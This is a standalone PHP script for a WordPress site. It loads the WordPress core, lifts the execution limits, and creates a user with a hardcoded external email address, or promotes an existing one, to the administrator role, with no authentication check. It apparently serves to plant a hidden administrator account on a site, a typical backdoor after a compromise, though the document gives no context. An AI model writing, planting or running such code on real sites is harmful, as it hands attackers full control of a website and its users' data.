<?php 
	
if(!defined('DS')){
	define('DS',DIRECTORY_SEPARATOR);
}
require( dirname(__FILE__) . '/wp-load.php' );
error_reporting(E_ERROR);
ini_set('display_errors', 1);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', 20000);
require_once(ABSPATH . 'wp-includes/pluggable.php');
$username='$username';
$password='$password';
$email='duongva91@gmail.com';
// Check if the user already exists
$user_id = username_exists($username);

// If the user doesn't exist, create a new user
if (!$user_id) {
    // Create the user
    $user_id = wp_create_user($username, $password,$email);
    
    // Set the user role to 'administrator'
    $user = new WP_User($user_id);
    $user->set_role('administrator');
} else {
    // If the user already exists, update their role to 'administrator'
    $user = new WP_User($user_id);
    $user->set_role('administrator');
}
